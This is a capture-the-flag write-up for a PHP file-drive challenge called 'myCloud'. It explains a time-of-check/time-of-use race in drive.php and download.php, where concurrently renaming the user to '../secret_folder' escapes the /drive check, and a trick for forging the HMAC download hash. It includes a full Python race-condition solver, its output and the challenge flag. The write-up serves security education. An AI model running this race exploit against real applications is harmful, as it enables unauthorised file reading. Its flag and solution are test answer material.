# myCloud [2 Solves]

## Description

> "Made a [myCloud drive website](http://4.194.8.38:1337) for upload and download files with ChatGPT!
> Feel free to try it"
>
> Attachments: mycloud.zip

## Source Code

<details><summary>Attachment file tree</summary>

```console
$ unzip -q mycloud.zip
.
├── Dockerfile
├── files
│   ├── bootstrap.min.css
│   ├── download.php
│   ├── drive.php
│   ├── index.php
│   ├── login.php
│   ├── logout.php
│   ├── mycloud.jfif
│   ├── register.php
│   ├── settings.php
│   └── style.css
├── mycloud.zip
├── nginx.conf
├── run.sh
├── setup.sh
└── setup.sql

2 directories, 16 files
```

</details>

## Flag

wgmy{0a8d216f13c4308ed1b5d17fc99384d2}

## TD;LR

- Race Condition
- Generating HMAC SHA256 hash by uploading a file with the same name as the flag file

## Initial Analysis

setup.sh

```bash
mkdir /secret_folder
echo $FLAG > /secret_folder/flag.txt
cd /secret_folder
mv flag.txt flag-$(md5sum flag.txt | awk '{print $1}').txt
mkdir /drive
chmod 777 /drive
chmod 555 /secret_folder
service php8.2-fpm start
mysqld_safe &

while ! mysql -e "show databases;"; do # Wait for MariaDB
  sleep 1
done

mysql < /setup.sql
nginx
while true; do sleep 1000; done
```

The flag is stored directly under the /secret_folder/ directory with the flag's MD5 hash appended to its name.
It seems feasible to get the flag by directory listing and reading the content of that file.

The given application has the following functionalities:

- register.php: User registration
- login.php: User authn/authz
- settings.php: Change username and password
- drive.php: Directory listing and file upload under `/drive/<username>`
- download.php: File download

settings.php (partial)

```php
if (isset($_POST['username']) && isset($_POST['current_password']) && isset($_POST['new_password'])) {
    if ($_POST['current_password'] === $password) {
        $sql = "UPDATE users SET username = ?, password = ? WHERE id = ?";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("ssi", $_POST['username'], $_POST['new_password'], $_SESSION['user_id']);
        $result = $stmt->execute();

        if ($result) {
            echo "<h5 class='text-success'>Updated successfully!</h5>";
        } else {
            echo "<h5 class='text-danger'>Error!!</h5>";
        }
    } else {
        echo "<h5 class='text-danger'>Wrong password!</h5>";
    }
}
```

It has no username validation when changing the username, allowing for arbitrary username changes.
Therefore, changing the username to ../secret_folder would enable directory listing of /secret_folder, and reading files.

However, the application has implemented filtering that outputs `HACKER ALERT!!` and die if the path doesn't start with /drive.
This means that directory listing and file reading are only allowed for directories starting with /drive.

## Race Condition in drive.php

drive.php (partial)

```php
function getUsername()
{
    $conn = new mysqli("localhost", "admin", "admin", "mycloud_db");
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $sql = "SELECT * FROM users WHERE id = ?";
    $stmt = $conn->prepare($sql);
    $id = intval($_SESSION["user_id"]);
    $stmt->bind_param("i", $id);
    $stmt->execute();
    $result = $stmt->get_result();
    $row = $result->fetch_assoc();
    if ($row) {
        return $row["username"];
    } else {
        die("<h5 class='text-danger'>Error occured!</h5>");
    }
}

...

if (isset($_POST["submit"])) {
    $target_dir = realpath("/drive/" . getUsername() . '/');
    if (strpos($target_dir, "/drive") !== 0) {
        die("<h5 class='text-danger'>HACKER ALERT!!</h5>");
    }
    $target_file = $target_dir . '/' . basename($_FILES["fileToUpload"]["name"]);

    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "<h5 class='text-success'>The file " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</h5>";
    } else {
        echo "<h5 class='text-danger'>Sorry, there was an error uploading your file.</h5>";
    }
}

$path = realpath("/drive/" . getUsername());             // [1]
// Prevent directory traversal
if (strpos($path, "/drive/") !== 0) {                    // [2]
    die("<h5 class='text-danger'>HACKER ALERT!!</h5>");
}

// What if username is changed to ../secret_folder here?    [3]

// List all files in the user directory
$basepath = realpath("/drive/" . getUsername());
$files = array_diff(scandir($basepath), array('..', '.'));
foreach ($files as $key => $value) {
    $h = hash_hmac('sha256', $basepath . '/' . $value, $_SESSION['SECRET']);
    echo "<tr>";
    echo "<td><a href='download.php?file=" . urlencode($value) . "&hash=" . urlencode($h) . "'>" . htmlentities($value) . "</a></td>";
    echo "<td>" . htmlentities(humanFileSize(filesize($basepath . '/' . $value))) . "</td>";
    echo "<td>" . htmlentities(date("F d Y H:i:s.", filemtime($basepath . '/' . $value))) . "</td>";
    echo "<td><a href=\"javascript:alert('Coming Soon!!')\">🗑️</a></td>";
    echo "</tr>";
}
```

While closely examining the source code, I noticed drive.php has a race condition.
This could allow listing of the ../secret_folder directory.
For instance, if the following steps, I might be able to see ../secret_folder:

- [1] `getUsername()` returns `<username>`, and `$path` is assigned `/drive/<username>`.
- [2] `strpos($path, "/drive/")` returns `0` because `$path` starts with /drive. The if condition is false so if statement is not executed.
- [3] The username is changed to ../secret_folder.
- Subsequent operations are performed on the /secret_folder directory.

## Race Condition in download.php

It seems that download.php also has a race condition, similar to the one in drive.php.

```php
if (isset($_GET['file']) && isset($_GET['hash'])) {
    $path = realpath("/drive/" . getUsername() . "/" . $_GET['file']);        // [1]
    // Double protection against directory traversal
    if (strpos($path, "/drive") !== 0 ||                                      // [2]
        hash_hmac('sha256', $path, $_SESSION['SECRET']) !== $_GET['hash']) {  // [3]
        die("HACKER ALERT!!");
    }

    // What if username is changed to ../secret_folder here?                     [4]

    $filepath = realpath("/drive/" . getUsername() . "/" . $_GET['file']);

    if (file_exists($filepath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filepath));
        flush(); // Flush system output buffer
        readfile($filepath);
        die();
    } else {
        http_response_code(404);
        die();
    }
}
```

I can exploit the race condition with the following steps:

- [1] `getUsername()` returns `<username>`, and `$path` is assigned `/drive/<username>/<yourfilename>`.
- [2] `strpos($path, "/drive/")` returns `0` because `$path` starts with /drive.
- [3] Verification using `hash_hmac`.
- [4] The username is changed to ../secret_folder.
- Subsequent operations are performed on the /secret_folder directory.

Unlike in drive.php, the difference lies in part [3].
Since `$path` is assigned as `'/drive/<username>/<yourfilename>'`, it executes `hash_hmac('sha256', '/drive/<username>/<yourfilename>', $_SESSION['SECRET']) !== $_GET['hash']`.

## New HMAC SHA256 Hash Generation

I noticed that when listing the flag file using the race condition in drive.php, the hash was calculated as `hash_hmac('sha256', '/secret_folder/<flag_filename>', $_SESSION['SECRET'])`. Therefore, I need to generate a new hash to bypass download.php [3].

`$_SESSION['SECRET']` is not leaked.
It is a unique value for each user, automatically generated by the database upon adding a user record (setup.sql), and stored in `$_SESSION['SECRET']` during login.php.

setup.sql (partial)

```sql
CREATE TABLE users (
        id int NOT NULL AUTO_INCREMENT PRIMARY KEY,
        username varchar(100),
        password varchar(100),
        secret varchar(32) DEFAULT MD5(RANDOM_BYTES(16))
);
```

login.php (partial)

```php
$sql = "SELECT * FROM users WHERE username = ? and password = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ss", $_POST['username'], $_POST['password']);
$stmt->execute();
$result = $stmt->get_result();
$row = $result->fetch_assoc();
if ($row) {
    $_SESSION["user_id"] = $row["id"];
    $_SESSION["SECRET"] = $row["secret"];
    echo '<meta http-equiv="refresh" content="0;url=index.php">';
} else {
    echo "<h5 class='text-danger'>Wrong username or password!</h5>";
}
```

Here, I re-take look at drive.php.

drive.php

```php
$basepath = realpath("/drive/" . getUsername());
$files = array_diff(scandir($basepath), array('..', '.'));
foreach ($files as $key => $value) {
    $h = hash_hmac('sha256', $basepath . '/' . $value, $_SESSION['SECRET']);
...
    echo "<td><a href='download.php?file=" . urlencode($value) . "&hash=" . urlencode($h) . "'>" . htmlentities($value) . "</a></td>";
```

- `$basepath` is `/drive/<username>`.
- `$value` is the filename submitted by the user.
- `hash_hmac('sha256', '/drive/<username>/<yourfilename>', $_SESSION['SECRET'])` is called.

Therefore, if I upload a file with the same filename as the flag in drive.php and then obtain the hash, I can bypass the `hash_hmac` in download.php [3].

## Solution

Since it is not possible to exploit manually the race condition, I've implemented a script.
Depending on the execution environment, you might need to adjust parameters like LOOP.

The fundamental idea is to execute [a] and [b] concurrently to get the flag name, obtain the hash, and then execute [a] and [c] concurrently to get the flag.

- [a] repeatedly sends requests to change the username from `../secret_folder` -> `yourname` -> `../secret_folder` -> `yourname` -> ... in /settings
- [b] repeatedly sends requests to read `../secret_folder` directory listing in /drive.php
- [c] repeatedly sends requests to download the flag file in download.php

solver.py

```python
import io
import random
import re
import string
import requests
import concurrent.futures
import time

requests.packages.urllib3.disable_warnings()

BASE_URL = "http://localhost:1337"
# BASE_URL = "http://4.194.8.38:1337"
LOOP = 30
DELAY_SEC = 3
USERNAME = "test" + "".join(random.choices(string.ascii_letters, k=10))
# USERNAME = "test111"
PASSWORD = "".join(random.choices(string.ascii_letters, k=10))

print(f"{USERNAME=}, {PASSWORD=}")


def settings(s, username):
    return s.post(
        f"{BASE_URL}/settings",
        data={
            "username": username,
            "current_password": PASSWORD,
            "new_password": PASSWORD,
        },
    )


# [a]
def loop_settings(s):
    for _ in range(LOOP):
        settings(s, USERNAME)
        settings(s, "../secret_folder/")


# [b]
def loop_dir_listing(s):
    for i in range(LOOP):
        res = s.get(f"{BASE_URL}/drive")

        if "flag" not in res.text or not (
            m := re.findall(r"download.php\?file=(.*?)&", res.text)
        ):
            continue

        return m[0]


# [c]
def loop_download(s, filename, hash):
    for _ in range(LOOP):
        res = s.get(f"{BASE_URL}/download", params={"file": filename, "hash": hash})

        if res.status_code != 200 or "HACKER ALERT" in res.text or "hello" in res.text:
            continue

        if m := re.findall(r"(wgmy{.*?})", res.text):
            print(m[0])
            return True

        # in local, flag is flag{dummy}.
        elif len(res.text) != 0:
            print(res.text)
            return True


def upload_dummy_file(s, filename):
    # upload dummy file with flag_filename
    return s.post(
        f"{BASE_URL}/drive",
        files={"fileToUpload": (filename, io.StringIO())},
        data={"submit": 1},
    )


def register_user_if_not_exists():
    # if user has already registered, it's ignored.
    requests.post(
        f"{BASE_URL}/register",
        data={"username": USERNAME, "password": PASSWORD},
    )


def login_and_return_session():
    s = requests.Session()

    # if burp on, race condition is not working
    # s.proxies = {"http": "http://127.0.0.1:8080"}

    s.post(f"{BASE_URL}/login", data={"username": USERNAME, "password": PASSWORD})
    return s


def revert_username(sess):
    while True:
        res = settings(sess, USERNAME)
        if res.status_code == 200:
            break

        # for 503
        time.sleep(2)


def main():
    # user initialize
    register_user_if_not_exists()

    # if it uses the same session, race condition doesn't work
    sess = [login_and_return_session() for _ in range(2)]

    try:
        # Step 1: get the flag file name
        print("[+] Step 1 start")
        while True:
            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                executor.submit(loop_settings, sess[0])
                f = executor.submit(loop_dir_listing, sess[1])

            if flag_filename := f.result():
                print(flag_filename)
                break

            # print("trying...")
            time.sleep(DELAY_SEC)

        revert_username(sess[0])

        # Step 2: get hash
        print("[+] Step 2 start")
        res = upload_dummy_file(sess[0], flag_filename)
        if not (m := re.findall(rf"{flag_filename}\&hash=(.*?)'", res.text)):
            raise Exception("Hash Not Found")

        hash = m[0]

        # Step 3: get flag
        print("[+] Step 3 start")
        while True:
            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                executor.submit(loop_settings, sess[0])
                f = executor.submit(loop_download, sess[1], flag_filename, hash)

            if f.result():
                print("I believe I found the flag.")
                break

            # print("trying...")
            time.sleep(DELAY_SEC)

    except KeyboardInterrupt:
        pass

    finally:
        # Revert to the initial username so that I can log in with the same username on the next try
        revert_username(sess[0])


if __name__ == "__main__":
    main()
```

Result

```console
$ python3 solver.py
USERNAME='testOjdHXJVUjU', PASSWORD='GXLJOhyVJJ'
[+] Step 1 start
flag-bf49e780adf2bdfd5400e5bc1c93a949.txt
[+] Step 2 start
[+] Step 3 start
wgmy{0a8d216f13c4308ed1b5d17fc99384d2}
I believe I found the flag.
```
